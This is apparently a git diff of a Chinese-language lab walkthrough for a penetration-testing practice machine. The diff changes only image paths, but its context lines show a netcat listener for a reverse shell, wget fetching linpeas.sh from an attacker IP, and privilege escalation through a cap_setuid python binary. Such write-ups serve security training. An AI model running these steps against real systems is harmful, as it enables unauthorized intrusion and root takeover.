@@ -74,7 +74,7 @@ nc -lvnp 4444
 
 * 获取到local.txt：
 
-<figure><img src="../../.gitbook/assets/14 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/14 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
@@ -89,7 +89,7 @@ python3 -m http.server
 wget http://192.168.45.244:8000/linpeas.sh
 ```
 
-<figure><img src="../../.gitbook/assets/15 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/15 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * 执行linpeas.sh：
 
@@ -98,7 +98,7 @@ chmod 777 linpeas.sh
 ./linpeas.sh
 ```
 
-<figure><img src="../../.gitbook/assets/16 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/16 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### 漏洞利用
 
@@ -108,7 +108,7 @@ chmod 777 linpeas.sh
 
 * 这是因为python 3.10作为可执行文件，被赋予了cap\_setuid的能力。在GTFOBins中找到了可利用的命令：
 
-<figure><img src="../../.gitbook/assets/18 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/18 (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### ROOT
 
